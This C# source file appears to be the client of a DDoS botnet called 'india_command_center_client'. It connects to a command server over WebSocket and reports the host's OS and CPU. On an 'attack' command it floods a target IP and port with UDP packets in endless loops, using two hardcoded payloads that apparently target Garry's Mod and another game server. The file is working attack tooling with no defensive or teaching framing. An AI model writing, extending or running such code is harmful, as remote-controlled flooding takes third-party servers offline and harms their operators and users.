using System.Net;
using System.Text;
using System.Net.Sockets;

using Serilog;
using Serilog.Core;

using WatsonWebsocket;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using Hardware.Info;

namespace india_command_center_client;

public class Config
{
    public string ip { get; set; }
    public int port { get; set; }
}

public class Main
{
    private readonly Logger _log = new LoggerConfiguration()
        .WriteTo.Console()
        .CreateLogger();
    
    private WatsonWsClient? _ws = null;
    private readonly HardwareInfo _hw = new();

    private readonly List<Socket> _socks = new();
    private readonly List<Tuple<Task, CancellationTokenSource>> _attacks = new();

    private bool _isConnected = false;

    private byte[] gmodPayload =
    {
        0xFF, 0xFF, 0xFF, 0xFF,
        0x71, 0xCB, 0x14, 0x31, 0x0C,
        0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    };

    private byte[] wfPayload =
    {
        0x3c, 0x0, 0x0, 0x49, 0xd4, 0x0, 0x0, 0x2, 0x64, 0x0, 0x0, 0x39, 0x6c, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x6,
        0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2d, 0xb1, 0xa2, 0x63, 0x7f, 0xd4, 0xff, 0xff, 0xff, 0xff,
        0x37, 0x34, 0x36, 0x64, 0x36, 0x61, 0x36, 0x38, 0x37, 0x33, 0x36, 0x32, 0x36, 0x65, 0x36, 0x34, 0x36, 0x38,
        0x37, 0x34, 0x36, 0x62, 0x36, 0x63, 0x37, 0x37, 0x36, 0x63, 0x37, 0x39, 0x37, 0x31, 0x37, 0x35, 0x37, 0x32,
        0x36, 0x63, 0x36, 0x34, 0x37, 0x32, 0x36, 0x62, 0x36, 0x32, 0x36, 0x38, 0x37, 0x33, 0x36, 0x34, 0x36, 0x33,
        0x36, 0x62, 0x36, 0x38, 0x36, 0x62, 0x36, 0x66, 0x36, 0x32, 0x37, 0x36, 0x36, 0x65, 0x36, 0x36, 0x33, 0x31,
        0x33, 0x37, 0x33, 0x39, 0x33, 0x34, 0x33, 0x31, 0x33, 0x35, 0x33, 0x32, 0x33, 0x37, 0x33, 0x30, 0x33, 0x34,
        0x32, 0x31, 0x33, 0x31, 0x33, 0x34, 0x33, 0x37, 0x33, 0x30, 0x33, 0x30, 0x32, 0x65, 0x33, 0x36, 0x33, 0x31,
        0x33, 0x32, 0x32, 0x65, 0x33, 0x31, 0x33, 0x38, 0x33, 0x39, 0x33, 0x30, 0x33, 0x30, 0x33, 0x61, 0x35, 0x38,
        0x34, 0x62, 0x33, 0x61, 0x33, 0x36, 0x36, 0x32, 0x33, 0x36, 0x33, 0x31, 0x33, 0x36, 0x36, 0x34, 0x33, 0x37,
        0x33, 0x30, 0x33, 0x36, 0x33, 0x36, 0x33, 0x37, 0x33, 0x30, 0x33, 0x36, 0x33, 0x31, 0x33, 0x36, 0x36, 0x35,
        0x33, 0x37, 0x36, 0x31, 0x33, 0x36, 0x33, 0x35, 0x33, 0x37, 0x33, 0x32, 0x33, 0x61
    };

    private async void HandlePacketRequestStatus()
    {
        var statusPkt = new Packet<ResponseStatus>(
            "responseStatus",
            new ResponseStatus
            {
                os = _hw.OperatingSystem.Name,
                cpu = _hw.CpuList.FirstOrDefault().Name,
                ip = ""
            });

        await _ws.SendAsync(SerializePacket(statusPkt));
    }

    private async Task HandleGmod(Attack attackInfo)
    {
        Socket s = new(SocketType.Dgram, ProtocolType.Udp);
        CancellationTokenSource cts = new();

        _socks.Add(s);

        var t = Task.Run(async () =>
        {
            while (true)
            {
                await s.SendToAsync(gmodPayload, IPEndPoint.Parse(attackInfo.ipPort));
            }
        }, cts.Token);

        _attacks.Add(Tuple.Create(t, cts));
    }

    private async Task HandleWf(Attack attackInfo)
    {
        Socket s = new(SocketType.Dgram, ProtocolType.Udp);
        CancellationTokenSource cts = new();

        _socks.Add(s);

        var t = Task.Run(async () =>
        {
            while (true)
            {
                await s.SendToAsync(wfPayload, IPEndPoint.Parse(attackInfo.ipPort));
            }
        }, cts.Token);

        _attacks.Add(Tuple.Create(t, cts));
    }


    private async void HandlePacketAttack(Attack attackInfo)
    {
        switch (attackInfo.type)
        {
            case 1:
                await HandleGmod(attackInfo);
                break;
            
            case 2:
                await HandleWf(attackInfo);
                break;
        }
    }

    private void HandleStopAttacks()
    {
        foreach (var a in _attacks)
            a.Item2.Cancel();

        foreach (var s in _socks)
            s.Close();

        _log.Information("stopped all attacks and cleared sockets.");
    }

    private async void DataReceived(object? s, MessageReceivedEventArgs msg)
    {
        _log.Information($"received from server ({msg.Client.IpPort}) {Encoding.UTF8.GetString(msg.Data)}");

        var packet = DeserializePacket(Encoding.UTF8.GetString(msg.Data));
        switch (packet.type)
        {
            case "requestStatus":
                HandlePacketRequestStatus();
                break;
            
            case "attack":
                HandlePacketAttack((packet as Packet<Attack>)!.content);
                break;
            
            case "stopAttacks":
                HandleStopAttacks();
                break;
        }
    }

    private async void ServerConnected(object? s, EventArgs msg)
    {
        _log.Information("connected to server");

        _isConnected = true;
    }

    private async void ServerDisconnected(object? s, EventArgs msg)
    {
        _log.Information("disconnected from server");

        _isConnected = false;
    }

    public string SerializePacket(IPacket pkt)
    {
        return JsonConvert.SerializeObject(pkt);
    }

    public IPacket DeserializePacket(string data)
    {
        var json = JObject.Parse(data);

        return json["type"]?.Value<string>() switch
        {
            "requestStatus" => json.ToObject<Packet<RequestStatus>>(),
            "responseStatus" => json.ToObject<Packet<ResponseStatus>>(),
            "attack" => json.ToObject<Packet<Attack>>(),
            "stopAttacks" => json.ToObject<Packet<StopAttacks>>(),

            _ => throw new JsonException("Unknown packet type")
        };
    }

    private async Task TryConnect(string ip, int port)
    {
        _ws = new(ip, port);

        _ws.MessageReceived += DataReceived;
        _ws.ServerConnected += ServerConnected;
        _ws.ServerDisconnected += ServerDisconnected;

        await _ws.StartAsync();
    }

    public async Task Start()
    {
        var start = DateTime.Now;

        _hw.RefreshAll();
        
        _log.Information("initializing client..");

        Config cfg = new Config
        {
            ip = "localhost",
            port = 1488
        };

        if (File.Exists("./config.json"))
        {
            cfg = JsonConvert.DeserializeObject<Config>(await File.ReadAllTextAsync("./config.json"));
        }
        else
        {
            await File.WriteAllTextAsync("./config.json", JsonConvert.SerializeObject(cfg, Formatting.Indented));
        }

        await TryConnect(cfg.ip, cfg.port);

        var end = DateTime.Now;

        _log.Information($"loaded in {(end - start).Milliseconds}ms");

        while (true)
        {
            try
            {
                if (!_ws.Connected)
                {
                    await Task.Delay(1000);

                    _log.Warning("not connected, trying to connect..");

                    await TryConnect(cfg.ip, cfg.port);
                }
            }
            catch (Exception ex)
            {
                _log.Error($"got exception: {ex.Message}");
            }
        }
    }
}
